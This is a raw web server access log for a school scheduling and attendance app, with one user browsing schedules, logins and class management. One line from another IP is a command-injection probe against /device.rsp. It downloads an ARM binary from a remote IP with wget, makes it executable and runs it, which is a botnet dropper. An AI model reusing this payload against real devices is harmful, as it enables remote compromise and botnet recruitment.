116.96.77.99 - - [08/May/2025:04:11:54 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1505870 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:12:10 +0000] "GET /api-nodejs/schedules/teachers-by-subject/1 HTTP/1.1" 200 5772 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:12:10 +0000] "GET /api-nodejs/classes?academicYear=2025-2026 HTTP/1.1" 200 317 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:12:14 +0000] "GET /api-nodejs/schedules/1 HTTP/1.1" 404 154 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:12:14 +0000] "GET /api-nodejs/attendance/schedule/1 HTTP/1.1" 200 109340 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:13:07 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 703 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:13:08 +0000] "GET /api-nodejs/attendance/schedule/1 HTTP/1.1" 200 109398 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:13:35 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 644 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:13:35 +0000] "GET /api-nodejs/attendance/schedule/1 HTTP/1.1" 200 109398 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:13:53 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 643 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:13:53 +0000] "GET /api-nodejs/attendance/schedule/1 HTTP/1.1" 200 109398 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
141.98.11.27 - - [08/May/2025:04:14:03 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 150 "-" "Mozila/5.0"
116.96.77.99 - - [08/May/2025:04:14:10 +0000] "GET /manifest.json HTTP/1.1" 304 0 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:10 +0000] "GET /static/js/bundle.js.map HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "GET /ScheduleManagement HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "GET /ws HTTP/1.1" 101 21294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "GET /static/js/bundle.js.map HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 402 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 402 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:15 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:16 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:16 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:21 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:21 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 6144 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 6144 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:22 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1505870 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:23 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1505870 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:32 +0000] "GET /api-nodejs/schedules/teachers-by-subject/1 HTTP/1.1" 200 5772 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:32 +0000] "GET /api-nodejs/classes?academicYear=2025-2026 HTTP/1.1" 200 317 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:33 +0000] "GET /api-nodejs/schedules/1 HTTP/1.1" 404 154 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:14:34 +0000] "GET /api-nodejs/attendance/schedule/1 HTTP/1.1" 200 109398 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:18 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 513 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:18 +0000] "GET /api-nodejs/users/details/quandhst41 HTTP/1.1" 200 1035 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:18 +0000] "GET /api-nodejs/users/details/quandhst41 HTTP/1.1" 200 1035 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 6144 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/classes/user/quandhst41 HTTP/1.1" 200 818 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:20 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1505870 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 6144 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/classes/user/quandhst41 HTTP/1.1" 200 818 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:21 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1505870 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:30 +0000] "GET /api-nodejs/schedules/teachers-by-subject/1 HTTP/1.1" 200 5772 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:30 +0000] "GET /api-nodejs/classes?academicYear=2025-2026 HTTP/1.1" 200 317 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:52 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 484 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:53 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:53 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/classes?search=&academicYear= HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/classes?search=&academicYear= HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:55 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:57 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:15:57 +0000] "GET /api-nodejs/classes?search=&academicYear= HTTP/1.1" 200 6144 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:11 +0000] "GET /api-nodejs/student-info?page=1&limit=500&academicYear=2024-2025&noClass=true HTTP/1.1" 200 82 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:11 +0000] "GET /api-nodejs/classes?academicYear=2024-2025 HTTP/1.1" 200 2951 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:18 +0000] "GET /api-nodejs/student-info?page=1&limit=500&academicYear=2024-2025&className=10A2 HTTP/1.1" 200 15186 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:22 +0000] "GET /api-nodejs/classes?search=11A2&academicYear=2025-2026 HTTP/1.1" 200 36 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:22 +0000] "POST /api-nodejs/classes/with-students HTTP/1.1" 201 392 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:22 +0000] "GET /api-nodejs/classes?search=&academicYear= HTTP/1.1" 200 6425 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:22 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 6425 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:28 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:28 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 6425 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:28 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:28 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.99 - - [08/May/2025:04:16:28 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/ScheduleManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
